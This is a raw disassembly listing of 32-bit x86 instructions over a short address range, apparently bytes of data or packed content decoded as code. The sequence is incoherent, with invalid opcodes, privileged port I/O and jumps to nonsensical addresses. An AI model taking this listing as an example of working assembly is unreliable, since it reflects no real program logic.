  422d4a:	imul   esi,DWORD PTR [esi+ecx*1+0x7a7f3b31],0x4
  422d52:	xchg   BYTE PTR [edx+0x5e],al
  422d55:	mov    bl,0xfa
  422d57:	stos   BYTE PTR es:[edi],al
  422d58:	cmp    BYTE PTR [ebx-0x676b3e08],bl
  422d5e:	dec    edx
  422d5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d60:	fwait
  422d61:	pop    eax
  422d62:	vcvtss2sd xmm0,xmm1,DWORD PTR [ecx]
  422d66:	out    dx,eax
  422d67:	push   ebp
  422d68:	ds cwde 
  422d6a:	inc    ecx
  422d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d6c:	jecxz  0x422d47
  422d6e:	mov    eax,0xa3fa60c0
  422d73:	lahf   
  422d74:	mov    al,0x8e
  422d76:	sbb    ch,ch
  422d78:	add    al,0xb0
  422d7a:	in     al,dx
  422d7b:	inc    edx
  422d7c:	push   edi
  422d7d:	jnp    0x422d94
  422d7f:	mov    ebx,0x4f4e267e
  422d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d85:	fisub  WORD PTR [eax-0x2dacc305]
  422d8b:	inc    eax
  422d8c:	add    DWORD PTR [ebx+0x2eae699c],0x942fc3a5
  422d96:	enter  0x1628,0xf0
  422d9a:	pop    eax
  422d9b:	adc    al,dl
  422d9d:	fnstenv [ebx]
  422d9f:	imul   BYTE PTR [ebx+0x3]
  422da2:	test   DWORD PTR [edx+esi*4],0xafa2b56
  422da9:	adc    bh,al
  422dab:	pop    esi
  422dac:	std    
  422dad:	xor    esi,DWORD PTR [esi+0x24663bd1]
  422db3:	xchg   BYTE PTR [ebp+ebp*1-0x2a8145ef],ah
  422dba:	repnz mov ebp,0x3a30b7f3
  422dc0:	mov    dh,0xa7
  422dc2:	cdq    
  422dc3:	pop    edi
  422dc4:	mov    bh,0x39
  422dc6:	into   
  422dc7:	pusha  
  422dc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dc9:	leave  
  422dca:	std    
  422dcb:	pop    ebx
  422dcc:	rcl    BYTE PTR [ebp+0x79],1
  422dcf:	dec    edx
  422dd0:	div    ah
  422dd2:	call   0x8f25b08f
  422dd7:	enter  0x7442,0x38
  422ddb:	loopne 0x422df8
  422ddd:	pushf  
  422dde:	push   eax
  422ddf:	fnstenv [edi+eiz*1+0x30]
  422de3:	div    BYTE PTR [edi]
  422de5:	add    eax,0xa34bec3b
  422dea:	(bad)  [ecx+0x12]
  422ded:	xlat   BYTE PTR ds:[ebx]
  422dee:	adc    eax,0x5eaadb1d
  422df3:	pusha  
  422df4:	push   ebx
  422df5:	aas    
  422df6:	sub    cl,BYTE PTR [ebx+0xd526e38]
  422dfc:	pop    esi
  422dfd:	das    
  422dfe:	stos   BYTE PTR es:[edi],al
  422dff:	lds    esi,FWORD PTR [ebx+0x6c]
  422e02:	rcr    BYTE PTR [eax],0xc1
  422e05:	ror    edi,1
  422e07:	cdq    
  422e08:	cmp    DWORD PTR [ebp+0x1a516adc],edi
  422e0e:	fnstenv [edi+ebx*2-0xeb38d46]
  422e15:	mov    ah,0xea
  422e17:	lods   al,BYTE PTR ds:[esi]
  422e18:	mov    ch,0xf5
  422e1a:	and    dh,al
  422e1c:	es loope 0x422e27
  422e1f:	push   ebp
  422e20:	fnstcw WORD PTR [eax]
  422e22:	gs dec esp
  422e24:	outs   dx,BYTE PTR ds:[esi]
  422e25:	(bad)  
  422e26:	and    eax,0x21dfb9ca
  422e2b:	or     al,ch
  422e2d:	adc    BYTE PTR [esi-0x26],dl
  422e30:	dec    eax
  422e31:	repnz xor BYTE PTR gs:[ebx-0x5dd4a886],cl
  422e39:	out    dx,eax
  422e3a:	lea    eax,[ebp+0x1edf73d8]
  422e40:	mov    eax,ds:0xb3ff4232
  422e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e46:	rol    ebp,cl
  422e48:	jmp    0xb2c7:0xc5195750
  422e4f:	retf   0x9b47
  422e52:	lahf   
  422e53:	push   esi
  422e54:	push   0xbd4abc64
  422e59:	push   cs
  422e5a:	dec    esi
  422e5b:	push   eax
  422e5c:	inc    ebx
  422e5d:	fnsave [esi-0x37e42537]
  422e63:	dec    ebx
  422e64:	sub    ebx,DWORD PTR [ecx-0x72]
  422e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e68:	cmp    ecx,eax
  422e6a:	pop    ebx
  422e6b:	cmp    ebp,DWORD PTR [ecx]
  422e6d:	xchg   ebp,eax
  422e6e:	int    0x67
  422e70:	jbe    0x422ec4
  422e72:	push   0x47
  422e74:	icebp  
  422e75:	add    eax,0x2ed0a3ed
  422e7a:	loop   0x422e6e
  422e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e7d:	and    DWORD PTR [ecx-0x28d0a48d],ebx
  422e83:	cwde   
  422e84:	ror    DWORD PTR [eax-0x75],cl
  422e87:	ret    0xb4c9
  422e8a:	cmp    edx,DWORD PTR [ecx]
  422e8c:	push   ecx
  422e8d:	sub    DWORD PTR [esi+0x6f48c3e1],ebp
  422e93:	and    BYTE PTR [edi+0x1797a7fe],dl
  422e99:	jne    0x422e8e
  422e9b:	mov    ebp,0xabbfe041
  422ea0:	cmp    al,0x6
  422ea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ea3:	ins    BYTE PTR es:[edi],dx
  422ea4:	push   ds
  422ea5:	and    dl,ah
  422ea7:	aam    0x2c
  422ea9:	out    dx,eax
  422eaa:	mov    esp,0xd0ebed4d
  422eaf:	scas   al,BYTE PTR es:[edi]
  422eb0:	dec    eax
  422eb1:	jnp    0x422eb4
  422eb3:	iret   
  422eb4:	adc    dh,dh
  422eb6:	loop   0x422ead
  422eb8:	test   DWORD PTR [edx],edi
  422eba:	mov    eax,DWORD PTR ds:0xeb619fe0
  422ec0:	(bad)  
  422ec1:	(bad)  
  422ec2:	jge    0x422e46
  422ec4:	pop    ds
  422ec5:	mov    ebx,0xb7d50e92
  422eca:	or     DWORD PTR ds:0x927672a0,edi
  422ed0:	out    dx,al
  422ed1:	inc    ebx
  422ed2:	mov    ebx,0x8b4e0e0a
  422ed7:	aad    0x9b
  422ed9:	pop    edx
  422eda:	mov    bh,0xcc
  422edc:	fcom   DWORD PTR [edx+eiz*8]
  422edf:	stc    
  422ee0:	inc    ecx
  422ee1:	xor    ebp,DWORD PTR [edx+ecx*8+0x13dcbb29]
  422ee8:	in     eax,0x5c
  422eea:	mov    ebx,0xac6af3c6
  422eef:	add    BYTE PTR [edi],bl
  422ef1:	xchg   edx,eax
  422ef2:	cmp    cl,BYTE PTR [bp+di]
  422ef5:	adc    eax,0x6fb62be9
  422efa:	jbe    0x422f3e
  422efc:	adc    eax,0x28407b0c
  422f01:	mov    al,0xda
  422f03:	cmp    ebp,DWORD PTR cs:[ecx]
  422f06:	jl     0x422ed9
  422f08:	pop    edx
  422f09:	ror    bl,0xac
  422f0c:	xor    BYTE PTR [edi],0xf5
  422f0f:	into   
  422f10:	popf   
  422f11:	push   esp
  422f12:	jae    0x422ed7
  422f14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f15:	sbb    eax,esi
  422f17:	xor    al,0x87
  422f19:	rep ins BYTE PTR es:[edi],dx
  422f1b:	inc    esp
  422f1c:	repnz inc ebx
  422f1e:	xor    al,0x14
  422f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f21:	jp     0x422f24
  422f23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f24:	mov    esp,0xe45df07a
  422f29:	mov    ds:0x1ab4508c,eax
  422f2e:	mov    esp,0xc90871ae
  422f33:	mov    cs,WORD PTR [ecx+0x6957d306]
  422f39:	mov    ebp,0xfc322ff5
  422f3e:	jns    0x422f74
  422f40:	mov    ebp,0x181d763a
  422f45:	add    DWORD PTR [ebx-0x4c],eax
  422f48:	xor    al,0xbd
  422f4a:	loope  0x422f15
  422f4c:	cwde   
  422f4d:	sti    
  422f4e:	xchg   esp,eax
  422f4f:	pop    esi
  422f50:	std    
  422f51:	add    bh,BYTE PTR [edi-0x28]
  422f54:	mov    bl,0x29
  422f56:	out    dx,eax
  422f57:	enter  0x154e,0x8f
  422f5b:	imul   eax,DWORD PTR [edx],0xd5ca1142
  422f61:	rol    BYTE PTR ds:0x13c1aa68,cl
  422f67:	test   BYTE PTR [ecx],dh
  422f69:	popf   
  422f6a:	sub    BYTE PTR [esp+esi*1-0x43b65905],dl
  422f71:	xchg   BYTE PTR [ebp-0x74],bl
  422f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f75:	jnp    0x422fac
  422f77:	add    dl,dl
  422f79:	pop    esi
  422f7a:	out    0x46,al
  422f7c:	cmp    eax,0x4ab4745d
  422f81:	adc    BYTE PTR [esi+eax*8],dh
  422f84:	push   ebp
  422f85:	add    al,0x3a
  422f87:	ins    BYTE PTR es:[edi],dx
  422f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f89:	mov    dh,0x5c
  422f8b:	mov    ds:0x4186f0c0,al
  422f90:	push   ss
  422f91:	mov    bh,0xd4
  422f93:	mov    es,WORD PTR [edi+0x60]
  422f96:	es add al,0x4e
  422f99:	add    cl,bh
  422f9b:	jecxz  0x422fe8
  422f9d:	cmp    al,0xd1
  422f9f:	(bad)  
  422fa0:	out    0x68,eax
  422fa2:	imul   esp,DWORD PTR [esi-0x57],0xffffff89
  422fa6:	inc    ebp
  422fa7:	mov    esp,0xace3a61a
  422fac:	andps  xmm5,XMMWORD PTR [ebp+ecx*2-0x52fcf1ac]
  422fb4:	mov    edi,0xc9189264
  422fb9:	(bad)
  422fbc:	scas   eax,DWORD PTR es:[edi]
  422fbd:	inc    eax
  422fbe:	repz sub DWORD PTR [ebp-0x6a05ac9e],ebx
  422fc5:	sub    al,0xf3
  422fc7:	mov    bh,0x1f
  422fc9:	rcr    BYTE PTR [esi],0xed
  422fcc:	jo     0x422f93
  422fce:	fldcw  WORD PTR [ecx]
  422fd0:	stos   DWORD PTR es:[edi],eax
  422fd1:	bound  eax,QWORD PTR [eax+eiz*1+0x39354d38]
  422fd8:	pop    ecx
  422fd9:	mov    dh,0xba
  422fdb:	out    0xfb,eax
  422fdd:	aaa    
  422fde:	enter  0x3a51,0x94
  422fe2:	push   0xdd
  422fe7:	add    BYTE PTR [eax],al
  422fe9:	add    BYTE PTR [eax+0x4e],dl
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422fcf
  422ff7:	add    BYTE PTR [edi+0x1be64df],ch
  422ffd:	add    BYTE PTR [edx-0x48fffffa],al
  423003:	imul   edx,DWORD PTR [ebx-0x61542642],0xf8f327db
  42300d:	cs je  0x422fee
  423010:	xlat   BYTE PTR ds:[ebx]
  423011:	mov    ecx,0xc8dd2191
  423016:	out    0x7e,al
  423018:	or     eax,0xe96994e
  42301d:	in     al,0xa8
  42301f:	cmp    DWORD PTR [esi+0x56],ebp
  423022:	test   eax,0xf5bb9a89
  423027:	das    
  423028:	adc    DWORD PTR [eax-0x68],edi
  42302b:	in     eax,0xf5
  42302d:	(bad)  
  42302f:	ins    DWORD PTR es:[edi],dx
  423030:	xchg   ebp,eax
  423031:	cld    
  423032:	add    esp,esp
  423034:	add    al,0x7a
  423036:	hlt    
  423037:	mov    es,WORD PTR [ebp+esi*4-0x3b2d97ca]
  42303e:	jle    0x42306e
  423040:	clc    
  423041:	cmp    DWORD PTR [ebx],0x3b
  423044:	cmp    dh,BYTE PTR [edi]
  423046:	mov    esi,0xd93f1bf1
  42304b:	sub    eax,0x30bcc011
  423050:	shl    BYTE PTR [ebp+0x58],0x5c
  423054:	sti    
  423055:	rcr    DWORD PTR [ebp+esi*8+0x32],cl
  423059:	and    ch,bh
  42305b:	push   ds
  42305c:	adc    BYTE PTR [ebx],dl
  42305e:	clts   
  423060:	inc    esi
  423061:	ss in  al,dx
  423063:	loop   0x42309d
  423065:	sar    BYTE PTR [ebx],cl
  423067:	add    esp,DWORD PTR [edx+ebp*1+0xf625032]
  42306e:	test   BYTE PTR [ecx],cl
  423070:	mov    ebx,0x6f43c8c4
  423075:	ror    dl,1
  423077:	adc    eax,0xb4d39c01
  42307c:	mov    eax,ds:0x71eee6fa
  423081:	pop    ecx
  423082:	ss pushf 
  423084:	loope  0x4230fa
  423086:	or     ebx,ebx
  423088:	cdq    
  423089:	fdivrp st(1),st
  42308b:	pop    edi
  42308c:	jl     0x4230cd
  42308e:	fsub   QWORD PTR [edi-0x407ac65c]
  423094:	dec    ebp
  423095:	xor    edx,esp
  423097:	mov    cl,0x64
  423099:	adc    DWORD PTR [esi],esp
  42309b:	lods   eax,DWORD PTR ds:[esi]
  42309c:	stc    
  42309d:	mov    bl,0xc9
  42309f:	cli    
  4230a0:	push   esi
  4230a1:	pop    edx
  4230a2:	and    ah,BYTE PTR [edi]
  4230a4:	(bad)  
  4230a5:	adc    edx,edx
  4230a7:	xlat   BYTE PTR ds:[ebx]
  4230a8:	(bad)  
  4230a9:	mov    esi,0xa1c9b80a
  4230ae:	fwait
  4230af:	test   eax,0xb406cc33
  4230b4:	mov    ds:0xba61d628,al
  4230b9:	repnz (bad) 
  4230bb:	ret    
  4230bc:	sbb    DWORD PTR [esi],0x14
  4230bf:	sar    BYTE PTR [eax],0x7f
  4230c2:	or     eax,0x9cd03a43
  4230c7:	nop
  4230c8:	stos   DWORD PTR es:[edi],eax
  4230c9:	cmp    al,0x76
  4230cb:	dec    esi
  4230cc:	outs   dx,DWORD PTR ds:[esi]
  4230cd:	outs   dx,BYTE PTR ds:[esi]
  4230ce:	cmp    cl,BYTE PTR [eax+0x68]
  4230d1:	stos   BYTE PTR es:[edi],al
  4230d2:	repz in al,0x69
  4230d5:	push   edx
  4230d6:	sbb    eax,0xf795376e
  4230db:	jmp    0x4230e4
  4230dd:	scas   eax,DWORD PTR es:[edi]
  4230de:	fdiv   QWORD PTR [ebp+0x42]
  4230e1:	je     0x423131
  4230e3:	pop    ds
  4230e4:	pop    ebx
  4230e5:	jecxz  0x4230d1
  4230e7:	bound  ebp,QWORD PTR [ebp+eax*1-0x3c]
  4230eb:	int3   
  4230ec:	mov    esp,0x943dd328
  4230f1:	push   ss
  4230f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230f3:	aam    0x68
  4230f5:	lds    ebp,FWORD PTR [esp+esi*1]
  4230f8:	pop    ecx
  4230f9:	fimul  DWORD PTR [edx]
  4230fb:	cdq    
  4230fc:	shl    cl,0x3d
  4230ff:	outs   dx,BYTE PTR ds:[esi]
  423100:	add    BYTE PTR fs:[ebx-0x5a5803ad],dh
  423107:	cs jae 0x42317e
  42310a:	adc    DWORD PTR [eax],esi
  42310c:	inc    edx
  42310d:	test   eax,0x1f94f0f0
  423112:	mov    ebx,0x990b1c73
  423117:	push   esi
  423118:	cs push eax
  42311a:	lods   al,BYTE PTR ds:[esi]
  42311b:	arpl   ax,ax
  42311d:	repnz pop ss
  42311f:	les    ebx,FWORD PTR [ebp-0x39243cc1]
  423125:	mov    dl,0xe0
  423127:	pop    es
  423128:	iret   
  423129:	call   0x38040817
  42312e:	sub    DWORD PTR [edx+0x152e091b],0xffffffcb
  423135:	sbb    DWORD PTR [edx+0x55c0580c],0xffffffda
  42313c:	fwait
  42313d:	adc    bh,BYTE PTR [edi-0x17]
  423140:	sar    BYTE PTR [ecx],cl
  423142:	push   ds
  423143:	dec    ebx
  423144:	jae    0x42317c
  423146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423148:	xchg   BYTE PTR [ecx+ecx*1+0x1b],al
  42314c:	adc    cl,BYTE PTR [ecx+0x35e27235]
  423152:	into   
  423153:	gs inc esi
  423155:	jb     0x423168
  423157:	add    BYTE PTR [eax+0x61],0xfa
  42315b:	mov    ch,0xee
  42315d:	out    dx,al
  42315e:	je     0x42318b
  423160:	jecxz  0x42315a
  423162:	cdq    
  423163:	call   0x6926:0x1bdc2b17
  42316a:	dec    edi
  42316b:	cmp    al,0x29
  42316d:	and    DWORD PTR [eax+0x2],ebx
  423170:	xor    DWORD PTR [eax],ebp
  423172:	and    DWORD PTR [eax+0x747e359f],0xffffffd3
  423179:	dec    eax
  42317a:	mov    ebp,0xf4e870a1
  42317f:	xor    BYTE PTR [esi+0x31afcae1],0xf6
  423186:	jl     0x42317e
  423188:	mov    edx,0x3758d83f
  42318d:	adc    DWORD PTR ds:0x9fc95f0c,ebp
  423193:	popa   
  423194:	pusha  
  423195:	test   al,0x8b
  423197:	leave  
  423198:	jnp    0x4231f2
  42319a:	std    
  42319b:	and    eax,ecx
  42319d:	push   0xffffffe1
  42319f:	(bad)  
  4231a0:	mov    esi,0xd0a3cef3
  4231a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231a6:	push   ss
  4231a7:	mov    ds:0x7bd852da,al
  4231ac:	sub    BYTE PTR [edx+0x7c],al
  4231af:	and    dh,BYTE PTR [edi+0x14]
  4231b2:	repnz add DWORD PTR [ecx+eiz*1+0x71ddd202],ecx
  4231ba:	out    0x12,al
  4231bc:	dec    ecx
  4231bd:	add    al,0xc4
  4231bf:	mov    ecx,0xb275192d
  4231c4:	dec    esi
  4231c5:	jg     0x42323a
  4231c7:	pop    eax
  4231c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231c9:	or     BYTE PTR [eax],ch
  4231cb:	mov    esp,ebx
  4231cd:	lods   eax,DWORD PTR ds:[esi]
  4231ce:	or     BYTE PTR [esi+0x1b],bh
  4231d1:	xchg   edx,eax
  4231d2:	mov    ds:0xb8c06142,eax
  4231d7:	call   0xc77bb9fc
  4231dc:	ds cld 
  4231de:	sub    DWORD PTR [eax+0x29],ebp
  4231e1:	xor    eax,0x3c62ad45
  4231e6:	jmp    0x4231d3
  4231e8:	fistp  QWORD PTR [edi]
  4231ea:	cld    
  4231eb:	push   esi
  4231ec:	loope  0x423195
  4231ee:	push   0x7a
  4231f0:	cld    
  4231f1:	jo     0x42318c
  4231f3:	mov    edi,0x80e9502a
  4231f8:	add    ch,dl
  4231fa:	sbb    BYTE PTR [ebp-0x36],al
  4231fd:	adc    al,0x52
  4231ff:	or     eax,0xdbaa7455
  423204:	adc    eax,DWORD PTR [ebx]
  423206:	daa    
  423207:	sub    eax,0x9e472dd4
  42320c:	sub    BYTE PTR [edx-0x2b],bh
  42320f:	xchg   edi,eax
  423210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423211:	je     0x4231a3
  423213:	aaa    
  423214:	in     al,dx
  423215:	mov    al,ds:0xbb23f3af
  42321a:	mov    eax,0x6e9204ec
  42321f:	add    BYTE PTR [eax-0x64e89c5f],bh
  423225:	rcl    BYTE PTR [ecx+edx*2+0x45],0xca
  42322a:	outs   dx,BYTE PTR ds:[esi]
  42322b:	cmc    
  42322c:	jl     0x423274
  42322e:	mov    cl,cl
  423230:	psubusw mm3,QWORD PTR [esi+0x7f1c2960]
  423237:	adc    BYTE PTR [edx+0x7d6aaf03],dl
  42323d:	test   eax,0xe3c21749
  423242:	sti    
  423243:	lods   al,BYTE PTR ds:[esi]
  423244:	sbb    BYTE PTR [edi+0x64dd6b0a],dh
  42324a:	xor    al,0x27
  42324c:	cmp    al,0x55
  42324e:	sbb    esi,eax
  423250:	cwde   
  423251:	mov    ah,0x1
  423253:	shl    BYTE PTR [edx+0x69],1
  423256:	leave  
  423257:	lods   eax,DWORD PTR ds:[esi]
  423258:	aas    
  423259:	cmp    eax,0xad758277
  42325e:	push   ebx
  42325f:	cmp    esp,ecx
  423261:	sar    ecx,1
  423263:	scas   eax,DWORD PTR es:[edi]
  423264:	sub    al,0xba
  423266:	sbb    DWORD PTR [esi],edx
  423268:	rol    DWORD PTR [eax-0x36],0x79
  42326c:	fucomip st,st(4)
  42326e:	xlat   BYTE PTR ds:[ebx]
  42326f:	sub    BYTE PTR [edx-0x2d963b84],bl
  423275:	dec    ebp
  423276:	jne    0x4232c1
  423278:	mov    al,0x4
  42327a:	(bad)  
  42327b:	or     BYTE PTR [ebx+0x5a4c25ac],dl
  423281:	mov    cl,0xad
  423283:	add    BYTE PTR [eax],cl
  423285:	retf   0x58f3
  423288:	(bad)  
  423289:	pop    ebp
  42328a:	xor    DWORD PTR [edx],ebp
  42328c:	jmp    FWORD PTR [ebp+0x12]
  42328f:	cmc    
  423290:	jb     0x42326d
  423292:	push   0xffffffe5
  423294:	xor    dl,ch
  423296:	push   es
  423297:	shr    DWORD PTR [edi+0x364dae1],cl
  42329d:	out    0x5f,eax
  42329f:	cmp    DWORD PTR gs:0x5c68c394,0xffffff91
  4232a7:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232a9:	mov    ebx,0x9d6fe214
  4232ae:	xor    al,0x7d
  4232b0:	adc    al,0x9c
  4232b2:	or     ebp,edi
  4232b4:	add    BYTE PTR [ecx],ch
  4232b6:	push   ebx
  4232b7:	repz popf 
  4232b9:	inc    esi
  4232ba:	inc    esi
  4232bb:	or     eax,0xbae42611
  4232c0:	add    dh,BYTE PTR [ebp-0x4b]
  4232c3:	pop    eax
  4232c4:	dec    ebp
  4232c5:	mov    al,0x26
  4232c7:	outs   dx,DWORD PTR ds:[esi]
  4232c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232c9:	fdiv   st,st(4)
  4232cb:	inc    esi
  4232cc:	inc    esi
  4232cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232ce:	fisttp DWORD PTR [ebx+0x72]
  4232d1:	jp     0x4232b9
  4232d3:	add    al,0x41
  4232d5:	jmp    0x1e58:0xebb33f86
  4232dc:	arpl   WORD PTR [ecx],si
  4232de:	push   eax
  4232df:	sbb    dl,al
  4232e1:	or     al,0x4a
  4232e3:	loope  0x423291
  4232e5:	xchg   esp,eax
  4232e6:	dec    edi
  4232e7:	mov    ds:0x2212caca,eax
  4232ec:	jnp    0x42333c
  4232ee:	outs   dx,DWORD PTR ds:[esi]
  4232ef:	(bad)  
  4232f0:	repnz or eax,0xae4ef26e
  4232f6:	jo     0x4232d3
  4232f8:	and    BYTE PTR [eax-0x15101f6f],bh
  4232fe:	mov    DWORD PTR [ebp+0x63],ebp
  423301:	mov    bl,0x20
  423303:	rcr    BYTE PTR [ecx-0x1e],0x80
  423307:	scas   al,BYTE PTR es:[edi]
  423308:	xchg   ecx,eax
  423309:	lock mov al,0x2a
  42330c:	(bad)  
  42330d:	jle    0x423337
  42330f:	add    eax,0x71694ef2
  423314:	cmp    al,0x99
  423316:	and    al,0x14
  423318:	mov    esi,0xe7803db4
  42331d:	pop    eax
  42331e:	shl    ebp,cl
  423320:	pop    ebp
  423321:	sbb    esi,ebp
  423323:	test   BYTE PTR [eax],ah
  423325:	int3   
  423326:	hlt    
  423327:	inc    BYTE PTR [edx]
  423329:	add    al,0xd5
  42332b:	jg     0x423315
  42332d:	xlat   BYTE PTR ds:[ebx]
  42332e:	adc    eax,0xbffdb815
  423333:	and    bh,BYTE PTR [ebx+0x477083bf]
  423339:	mov    al,ds:0x11ca7ce9
  42333e:	int3   
  42333f:	sub    BYTE PTR [edi],ch
  423341:	sub    al,0xec
  423343:	lahf   
  423344:	adc    DWORD PTR [edi-0x3d4cd3b9],esi
  42334a:	repnz das 
  42334c:	leave  
  42334d:	mov    ebx,0xecdc537e
  423352:	(bad)  
  423353:	fmul   DWORD PTR [edi-0x3d933abb]
  423359:	rol    DWORD PTR [eax-0xb],0xe7
  42335d:	icebp  
  42335e:	mov    ah,0xd3
  423360:	mov    edx,0xee3228dd
  423365:	ja     0x4233de
  423367:	add    BYTE PTR [ebp-0x6e],dh
  42336a:	mov    esi,0x3223003d
  42336f:	(bad)  
  423370:	popf   
  423371:	(bad)  
  423372:	(bad)  
  423373:	jge    0x4233cf
  423375:	xor    eax,0x4e765350
  42337a:	rcr    eax,cl
  42337c:	hlt    
  42337d:	lods   al,BYTE PTR ds:[esi]
  42337e:	push   ds
  42337f:	mov    cl,0xcb
  423381:	xor    BYTE PTR [esi],bl
  423383:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423385:	outs   dx,DWORD PTR ds:[esi]
  423386:	dec    edx
  423387:	cld    
  423388:	cwde   
  423389:	lock rcr ebx,1
  42338c:	aaa    
  42338d:	cmp    dh,BYTE PTR [esi+0x38939eab]
  423393:	and    BYTE PTR [esi+0x37a58fdb],cl
  423399:	push   0x67
  42339b:	sub    edx,DWORD PTR [esi-0x54]
  42339e:	out    dx,al
  42339f:	je     0x423377
  4233a1:	ja     0x423350
  4233a3:	scas   eax,DWORD PTR es:[edi]
  4233a4:	xchg   ecx,eax
  4233a5:	inc    ecx
  4233a6:	fdiv   QWORD PTR [edx+0x2a]
  4233a9:	jg     0x423412
  4233ab:	mov    ah,0xbc
  4233ad:	mov    esi,0x4f9972ee
  4233b2:	sub    al,0x37
  4233b4:	stos   BYTE PTR es:[edi],al
  4233b5:	add    BYTE PTR gs:[edx-0x26],0x3f
  4233ba:	out    dx,eax
  4233bb:	sub    dl,BYTE PTR [edx+0xd3358d2]
  4233c1:	xchg   DWORD PTR [edi-0x272b548f],esi
  4233c7:	cmp    eax,0xbe68d4a4
  4233cc:	(bad)  
  4233cd:	fninit 
  4233cf:	mov    ebp,0x89fc2e6
  4233d4:	lock or BYTE PTR [eax-0x24e09be8],dh
  4233db:	out    dx,al
  4233dc:	xchg   BYTE PTR [ecx-0x1511ea74],bl
  4233e2:	push   cs
  4233e3:	jle    0x4233f8
  4233e5:	inc    edx
  4233e6:	sbb    BYTE PTR [esp+ebp*1-0x3d],bl
  4233ea:	test   BYTE PTR ds:0xb47b9d74,dh
  4233f0:	inc    eax
  4233f1:	mov    ah,0x3d
  4233f3:	aas    
  4233f4:	jge    0x4233b8
  4233f6:	ss mov ch,0x92
  4233f9:	cmp    edi,DWORD PTR [ebx]
  4233fb:	add    dl,BYTE PTR [ecx]
  4233fd:	inc    BYTE PTR [esi+0x62]
  423400:	int    0x35
  423402:	std    
  423403:	repnz sub esp,edx
  423406:	mov    ebx,0x83b003cc
  42340b:	mov    edi,0xe11b289d
  423410:	and    al,0x81
  423412:	int    0xc1
  423414:	sub    bh,0xa1
  423417:	daa    
  423418:	pusha  
  423419:	sbb    al,0xb8
  42341b:	sub    ebp,DWORD PTR [ecx-0x1b]
  42341e:	mov    al,0x2b
  423420:	adc    al,0x45
  423422:	sub    al,0x31
  423424:	sub    esp,DWORD PTR [ecx]
  423426:	das    
  423427:	xchg   BYTE PTR [edx],bl
  423429:	sbb    eax,0xbc993851
  42342e:	jg     0x42348a
  423430:	mov    ds:0xd45657a6,eax
  423435:	mov    ebp,0x8e54d49f
  42343a:	dec    ebx
  42343b:	mov    ch,0x83
  42343d:	cli    
  42343e:	push   esi
  42343f:	fdiv   st(0),st
  423441:	cmp    eax,0x650718ec
  423446:	fst    DWORD PTR [ecx-0x7e]
  423449:	sub    edx,eax
  42344b:	dec    DWORD PTR [esi]
  42344d:	retf   
  42344e:	mov    al,ds:0xc800398a
  423453:	(bad)  
  423454:	cli    
  423455:	retf   0xfba2
  423458:	and    al,0x45
  42345a:	sbb    dl,ch
  42345c:	fsub   QWORD PTR [eax-0x10]
  42345f:	dec    esp
  423460:	inc    esp
  423461:	into   
  423462:	xor    dl,bl
  423464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423465:	mov    DWORD PTR [edi-0x74],ebx
  423468:	dec    edx
  423469:	ret    0x42ed
  42346c:	mov    esp,0xc7953163
  423471:	mov    WORD PTR [esi+edi*4+0x17],ss
  423475:	out    0x3b,al
  423477:	cli    
  423478:	pop    edi
  423479:	pop    ebx
  42347a:	(bad)
  42347e:	ret    0x4e0c
  423481:	nop
  423482:	xchg   ecx,eax
  423483:	les    esp,FWORD PTR [esi+0x79ea2439]
  423489:	mov    esp,0x2dbca499
  42348e:	add    ebp,ebx
  423490:	in     al,dx
  423491:	(bad)  
  423492:	push   0xffffffcf
  423494:	mov    al,ds:0xb4dbb4b2
  423499:	ss mov dh,0xe0
  42349c:	and    BYTE PTR [edx+0x65],ch
  42349f:	push   0xffffff93
  4234a1:	sbb    BYTE PTR [ecx-0x62f1cd7c],cl
  4234a7:	cmp    BYTE PTR [ebx],ah
  4234a9:	xchg   edi,eax
  4234aa:	sahf   
  4234ab:	xor    DWORD PTR [edi+ebp*4-0x33],esp
  4234af:	jl     0x423510
  4234b1:	push   0xffffffa8
  4234b3:	(bad)  
  4234b5:	iret   
  4234b6:	retf   
  4234b7:	push   es
  4234b8:	jmp    0x6a86bc2e
  4234bd:	lea    eax,[edx]
  4234bf:	(bad)  
  4234c0:	lahf   
  4234c1:	mov    ecx,0x4086f716
  4234c6:	dec    eax
  4234c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234c9:	in     eax,dx
  4234ca:	ror    DWORD PTR [ecx],1
  4234cc:	sub    eax,0xe214bd70
  4234d1:	aaa    
  4234d2:	jae    0x4234af
  4234d4:	pusha  
  4234d5:	jnp    0x42351f
  4234d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234d8:	mov    ah,0xfc
  4234da:	pusha  
  4234db:	xchg   ebx,eax
  4234dc:	clc    
  4234dd:	push   esi
  4234de:	data16 or ah,BYTE PTR [ebx]
  4234e1:	jb     0x423513
